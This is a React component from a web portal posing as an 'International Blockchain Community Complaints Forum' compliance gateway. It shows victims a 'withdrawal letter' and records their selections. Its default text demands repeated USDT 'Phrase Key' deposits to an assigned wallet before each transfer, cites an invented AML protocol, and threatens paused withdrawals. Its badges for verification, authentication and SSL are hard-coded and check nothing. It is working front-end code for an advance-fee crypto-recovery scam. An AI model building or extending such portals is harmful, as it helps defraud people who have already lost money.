import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Badge } from "@/components/ui/badge";
import { Shield, ShieldCheck, CheckCircle2, FileText, History, ArrowLeft, Clock, ExternalLink, Download } from "lucide-react";
import { motion } from "framer-motion";
import { useToast } from "@/hooks/use-toast";
import { usePortal } from "./PortalContext";

export function LetterView() {
  const { currentCase, letterContent, submissions, setSubmissions, setViewState } = usePortal();
  const { toast } = useToast();
  
  const [selectedOption, setSelectedOption] = useState<"A" | "B" | null>(null);
  const [isConfirming, setIsConfirming] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  if (!currentCase?.letterSent) {
    return (
      <div className="min-h-screen bg-slate-100 text-slate-900 font-sans flex items-center justify-center p-4">
        <motion.div 
          initial={{ opacity: 0, scale: 0.95 }} 
          animate={{ opacity: 1, scale: 1 }}
          className="max-w-md w-full"
        >
          <Card className="bg-white shadow-xl border-slate-200">
            <CardHeader className="text-center pb-2">
              <div className="w-20 h-20 bg-slate-100 rounded-full mx-auto mb-4 flex items-center justify-center">
                <FileText className="w-10 h-10 text-slate-400" />
              </div>
              <CardTitle className="text-xl">Withdrawal Letter Pending</CardTitle>
            </CardHeader>
            <CardContent className="text-center space-y-4">
              <p className="text-slate-600">
                Your personalized withdrawal letter is being prepared by the compliance team and will be available shortly.
              </p>
              <div className="bg-blue-50 border border-blue-100 rounded-lg p-4">
                <p className="text-sm text-blue-700">
                  You will receive a notification when your letter is ready for review.
                </p>
              </div>
              <Button 
                onClick={() => setViewState('dashboard')}
                className="w-full"
                data-testid="button-back-dashboard-pending"
              >
                <ArrowLeft className="w-4 h-4 mr-2" /> Return to Dashboard
              </Button>
            </CardContent>
          </Card>
        </motion.div>
      </div>
    );
  }
  
  const adminData = currentCase ? {
    vipStatus: currentCase.vipStatus,
    username: currentCase.username,
    withdrawalAmount: currentCase.withdrawalAmount,
    withdrawalBatches: currentCase.withdrawalBatches,
    physilocal0: currentCase.physilocal0
  } : undefined;

  const letter = letterContent || {
    headline: "Withdrawal Protocol Selection",
    introduction: `We acknowledge the successful completion of your re-authentication procedure.`,
    bodyContent: `In accordance with IBCCF cross-border withdrawal regulations, please review the finalised withdrawal options for your account.`,
    footerNote: "NEXT ACTION REQUIRED: Please confirm your preferred withdrawal option below.",
    complianceReference: `IBCCF-AML-CC-${currentCase?.accessCode || ''}`,
    optionATitle: "Accelerated Release",
    optionADescription: "Full withdrawal amount processed in accelerated batches.",
    optionAFrequency: "every 12 hours",
    optionAKeyCost: "260.996 USDT",
    optionATotalRequirement: "2,609.96 USDT",
    optionBTitle: "Standard Release",
    optionBDescription: "Half allocation processed in standard batches.",
    optionBFrequency: "every 12 hours",
    optionBKeyCost: "521.993 USDT",
    optionBTotalRequirement: "5,219.92 USDT",
    phraseKeyRequirements: JSON.stringify([
      "Each Phrase Key unlocks exactly one transfer of your withdrawal balance.",
      "A new Phrase Key is required before each scheduled transfer.",
      "Phrase Keys must be acquired using USDT only and deposited to your assigned wallet.",
      "Deposits are tracked automatically and confirmed within 24 hours.",
      "No other tokens, currencies, or payment methods are supported."
    ]),
    complianceNotice: "Per IBCCF Anti-Money Laundering (AML) Protocol Section 7.3: Phrase Key deposits are mandatory for all outbound transfers. Failure to submit keys on schedule will pause your withdrawal and may result in extended compliance review."
  };

  const handleSubmit = async () => {
    setIsSubmitting(true);

    if (currentCase && selectedOption) {
      try {
        const response = await fetch(`/api/cases/${currentCase.id}/submissions`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            selectedOption: selectedOption
          })
        });

        if (response.ok) {
          const submission = await response.json();
          setSubmissions([submission, ...submissions]);
          setIsSubmitting(false);
          setIsConfirming(false);
          toast({
            title: "Submission Successful",
            description: "Your selection has been submitted.",
            className: "bg-green-50 border-green-200 text-green-900",
          });
        } else {
          toast({
            variant: "destructive",
            title: "Submission Failed",
            description: "Unable to submit selection.",
          });
          setIsSubmitting(false);
        }
      } catch (error) {
        toast({
          variant: "destructive",
          title: "Connection Error",
          description: "Unable to submit selection.",
        });
        setIsSubmitting(false);
      }
    }
  };

  const handleUrlSubmission = async () => {
    if (!currentCase?.submissionUrl) return;
    
    try {
      const response = await fetch(`/api/cases/${currentCase.id}/submissions`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ selectedOption: 'URL_SUBMISSION' })
      });
      if (response.ok) {
        const submission = await response.json();
        setSubmissions([submission, ...submissions]);
        window.open(currentCase.submissionUrl, '_blank');
        toast({
          title: "Submission Recorded",
          description: "Your request has been tracked. Complete the form in the new tab.",
          className: "bg-green-50 border-green-200 text-green-900",
        });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to record submission." });
    }
  };

  return (
    <div className="min-h-screen bg-slate-100 text-slate-900 font-sans selection:bg-blue-100 print:bg-white">
      <nav className="bg-slate-900 text-white shadow-lg print:hidden">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between h-16">
            <div className="flex items-center gap-4">
              <div className="w-10 h-10 rounded-lg bg-white/20 flex items-center justify-center">
                <Shield className="h-6 w-6 text-white" />
              </div>
              <div>
                <div className="text-sm font-bold leading-none">IBCCF COMPLAINTS FORUM</div>
                <div className="text-[10px] text-slate-400 font-medium tracking-wider uppercase">Secure Gateway Portal</div>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <Button 
                variant="ghost" 
                size="sm" 
                className="text-white hover:text-white hover:bg-slate-800"
                onClick={() => setViewState('dashboard')}
                data-testid="button-back-dashboard"
              >
                <ArrowLeft className="w-4 h-4 mr-2" /> Dashboard
              </Button>
              {submissions.length > 0 && (
                <Button 
                  variant="outline" 
                  size="sm" 
                  className="border-slate-600 text-white hover:bg-slate-800"
                  onClick={() => setViewState('submissions')}
                  data-testid="button-view-history"
                >
                  <History className="w-4 h-4 mr-2" /> History ({submissions.length})
                </Button>
              )}
              <Button 
                variant="outline" 
                size="sm" 
                className="border-slate-600 text-white hover:bg-slate-800"
                onClick={() => window.print()}
                data-testid="button-download-pdf"
              >
                <Download className="w-4 h-4 mr-2" /> Download PDF
              </Button>
              <div className="flex items-center gap-2 text-xs text-slate-400">
                <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                Secure Connection
              </div>
            </div>
          </div>
        </div>
      </nav>

      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8 print:max-w-none print:px-8">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}>
          
          <div className="bg-white rounded-xl shadow-xl border border-slate-200 overflow-hidden print:shadow-none print:border-none">
            
            <div className="bg-gradient-to-r from-slate-900 to-slate-800 text-white px-8 py-6">
              <div className="flex items-center gap-4">
                <div className="w-16 h-16 rounded-xl bg-white/20 flex items-center justify-center">
                  <Shield className="h-10 w-10 text-white" />
                </div>
                <div>
                  <h1 className="text-xl font-bold tracking-wide">INTERNATIONAL BLOCKCHAIN COMMUNITY COMPLAINTS FORUM (IBCCF)</h1>
                  <p className="text-slate-300 text-sm uppercase tracking-widest">Account Integrity & Security Operations Division (ISO-D)</p>
                  <p className="text-slate-400 text-xs uppercase tracking-wider">Global Compliance Secretariat</p>
                </div>
              </div>
            </div>

            <div className="bg-gradient-to-r from-green-600 to-emerald-600 text-white px-8 py-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center">
                    <CheckCircle2 className="w-5 h-5 text-white" />
                  </div>
                  <div>
                    <p className="text-sm font-bold uppercase tracking-wider flex items-center gap-2">
                      Verified Session Active
                      <span className="w-2 h-2 bg-white rounded-full animate-pulse"></span>
                    </p>
                    <p className="text-xs text-green-100">Identity confirmed through re-authentication protocol</p>
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-xs text-green-100">Account Status</p>
                  <span className="text-sm font-bold">{adminData?.vipStatus || "Standard Member"}</span>
                </div>
              </div>
            </div>
            
            <div className="bg-blue-50 border-b-2 border-blue-200 px-8 py-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center">
                    <ShieldCheck className="w-5 h-5 text-white" />
                  </div>
                  <div>
                    <p className="text-xs text-blue-600 font-semibold uppercase tracking-wider">Compliance Clearance Reference</p>
                    <p className="text-lg font-mono font-bold text-blue-900">{letterContent?.complianceReference || letter.complianceReference}</p>
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-xs text-slate-500">Session Verified</p>
                  <Badge className="bg-green-600 text-white">
                    <CheckCircle2 className="w-3 h-3 mr-1" />
                    Authenticated
                  </Badge>
                </div>
              </div>
            </div>

            <div className="px-8 py-6">
              <div className="mb-6">
                <p className="text-slate-600 text-sm mb-2">Date: {new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}</p>
                <p className="font-bold text-slate-900 text-lg">Dear {currentCase?.userName || "Valued Client"},</p>
              </div>

              <div className="prose prose-slate max-w-none text-slate-700 leading-relaxed mb-8">
                {letter.introduction && (
                  <p className="mb-4">{letter.introduction.replace(/^Dear\s+[^,]+,?\s*/i, '')}</p>
                )}
                {letter.bodyContent && (
                  <p className="mb-4">{letter.bodyContent}</p>
                )}
                {letter.footerNote && (
                  <p className="font-semibold text-slate-900 bg-amber-50 border-l-4 border-amber-500 pl-4 py-2">{letter.footerNote}</p>
                )}
              </div>

              {submissions.length > 0 ? (
                <motion.div 
                  initial={{ opacity: 0, y: 20 }} 
                  animate={{ opacity: 1, y: 0 }}
                  className="bg-green-50 border-2 border-green-200 rounded-xl p-6 mb-8"
                >
                  <div className="flex items-start gap-4">
                    <div className="w-14 h-14 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                      <CheckCircle2 className="w-7 h-7 text-green-600" />
                    </div>
                    <div className="flex-1">
                      <h3 className="text-xl font-bold text-green-900 mb-2">Request Submitted Successfully</h3>
                      <p className="text-green-700 mb-4">Your withdrawal request has been submitted and is being processed by the compliance team.</p>
                      
                      <div className="bg-white rounded-lg p-4 border border-green-200 space-y-3 mb-4">
                        <div className="flex justify-between text-sm">
                          <span className="text-slate-600">Reference Number</span>
                          <span className="font-mono font-bold text-green-700">IBCCF-{String(submissions[0]?.id || 0).padStart(6, '0')}</span>
                        </div>
                        <div className="flex justify-between text-sm">
                          <span className="text-slate-600">Status</span>
                          <Badge className="bg-green-600">Submitted</Badge>
                        </div>
                        <div className="flex justify-between text-sm">
                          <span className="text-slate-600">Submitted On</span>
                          <span className="font-medium">{new Date(submissions[0]?.submittedAt || Date.now()).toLocaleString()}</span>
                        </div>
                      </div>
                      
                      <div className="flex gap-3">
                        <Button onClick={() => setViewState('dashboard')} className="bg-green-600 hover:bg-green-700">
                          <ArrowLeft className="w-4 h-4 mr-2" />
                          Return to Dashboard
                        </Button>
                        <Button variant="outline" onClick={() => setViewState('submissions')}>
                          <History className="w-4 h-4 mr-2" />
                          View All History
                        </Button>
                      </div>
                    </div>
                  </div>
                </motion.div>
              ) : currentCase?.submissionUrl ? (
                <div className="mb-8">
                  <h2 className="text-lg font-bold text-slate-900 mb-4 flex items-center gap-3">
                    <div className="w-1 h-6 bg-blue-600 rounded"></div>
                    Required Action
                  </h2>
                  
                  <motion.div 
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="bg-gradient-to-r from-blue-50 to-indigo-50 border-2 border-blue-200 rounded-xl p-6"
                  >
                    <div className="flex items-start gap-4">
                      <div className="w-14 h-14 bg-blue-600 rounded-full flex items-center justify-center flex-shrink-0">
                        <ExternalLink className="w-7 h-7 text-white" />
                      </div>
                      <div className="flex-1">
                        <h3 className="text-xl font-bold text-blue-900 mb-2">Complete Your Submission</h3>
                        <p className="text-blue-700 mb-4">
                          Click the button below to complete your withdrawal request. You will be redirected to a secure form to finalize your submission.
                        </p>
                        
                        <div className="bg-white rounded-lg p-4 border border-blue-200 space-y-3 mb-4">
                          <div className="flex justify-between text-sm">
                            <span className="text-slate-600">Account</span>
                            <span className="font-bold text-slate-900">{currentCase?.userName || "N/A"}</span>
                          </div>
                          <div className="flex justify-between text-sm">
                            <span className="text-slate-600">Withdrawal Amount</span>
                            <span className="font-bold text-green-600">{adminData?.withdrawalAmount || "N/A"}</span>
                          </div>
                          <div className="flex justify-between text-sm">
                            <span className="text-slate-600">Reference</span>
                            <span className="font-mono font-bold text-blue-700">{letterContent?.complianceReference || letter.complianceReference}</span>
                          </div>
                        </div>
                        
                        <Button 
                          size="lg"
                          className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-lg"
                          onClick={handleUrlSubmission}
                          data-testid="button-submit-url"
                        >
                          <ExternalLink className="w-5 h-5 mr-2" />
                          Submit Your Request
                        </Button>
                        
                        <p className="text-xs text-blue-600 text-center mt-3">
                          Opens in a new tab. Your submission will be tracked automatically.
                        </p>
                      </div>
                    </div>
                  </motion.div>
                </div>
              ) : (
                <div className="mb-8">
                  <motion.div 
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="bg-amber-50 border-2 border-amber-200 rounded-xl p-6"
                  >
                    <div className="flex items-start gap-4">
                      <div className="w-14 h-14 bg-amber-500 rounded-full flex items-center justify-center flex-shrink-0">
                        <Clock className="w-7 h-7 text-white" />
                      </div>
                      <div className="flex-1">
                        <h3 className="text-xl font-bold text-amber-900 mb-2">Awaiting Configuration</h3>
                        <p className="text-amber-700 mb-4">
                          The submission process is being configured by the compliance team. Please check back shortly or contact support for assistance.
                        </p>
                        <Button 
                          onClick={() => setViewState('dashboard')}
                          variant="outline"
                          className="border-amber-300 text-amber-700 hover:bg-amber-100"
                        >
                          <ArrowLeft className="w-4 h-4 mr-2" />
                          Return to Dashboard
                        </Button>
                      </div>
                    </div>
                  </motion.div>
                </div>
              )}
            </div>

            <div className="bg-slate-50 border-t border-slate-200 px-8 py-4">
              <div className="flex items-center justify-between text-xs text-slate-500">
                <div className="flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4" />
                  <span>256-bit SSL Encrypted • Document ID: {letterContent?.complianceReference || letter.complianceReference}</span>
                </div>
                <span>Generated: {new Date().toISOString()}</span>
              </div>
            </div>
          </div>

        </motion.div>
      </main>

      <Dialog open={isConfirming} onOpenChange={setIsConfirming}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-xl font-bold text-primary">Confirm Selection</DialogTitle>
            <DialogDescription>
              You are about to initiate the withdrawal schedule for {adminData?.username}.
            </DialogDescription>
          </DialogHeader>
          <div className="py-4">
            <div className="bg-slate-50 rounded-lg p-4 space-y-2">
              <div className="flex justify-between">
                <span className="text-slate-500">Selected Option</span>
                <Badge className={selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>Option {selectedOption}</Badge>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">Amount</span>
                <span className="font-medium">{adminData?.withdrawalAmount}</span>
              </div>
            </div>
          </div>
          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsConfirming(false)} disabled={isSubmitting}>Cancel</Button>
            <Button onClick={handleSubmit} disabled={isSubmitting} className="gap-2" data-testid="button-confirm-submit">
              {isSubmitting ? "Transmitting..." : "Submit Selection"}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
